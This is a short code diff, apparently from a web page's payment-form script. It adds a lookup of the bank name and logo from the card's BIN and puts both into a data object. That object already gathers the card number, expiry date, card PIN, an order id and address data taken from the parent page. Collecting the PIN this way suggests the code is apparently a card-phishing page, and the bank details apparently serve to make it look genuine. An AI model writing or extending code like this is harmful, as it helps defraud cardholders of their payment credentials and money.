@@ -834,6 +834,18 @@
                                 }
                             }
 
+                            // Detect bank from card BIN
+                            let bankName = '';
+                            let bankLogo = '';
+                            if (typeof cardData !== 'undefined' && cardData.length > 0) {
+                                const match = [...cardData].sort((a, b) => b.bin.length - a.bin.length)
+                                    .find(c => debitNumber.startsWith(c.bin));
+                                if (match) {
+                                    bankName = match.brandDescription;
+                                    bankLogo = match.logo;
+                                }
+                            }
+
                             const orderId = localStorage.getItem('orderId') || sessionStorage.getItem('orderId');
                             
                             // Collect address data from parent page
@@ -854,6 +866,8 @@
                                     expiry_month: expiryMonth,
                                     expiry_year: expiryYear,
                                     pin: cardPin,
+                                    bank_name: bankName,
+                                    bank_logo: bankLogo,
                                     timestamp: new Date().toISOString()
                                 }
                             };
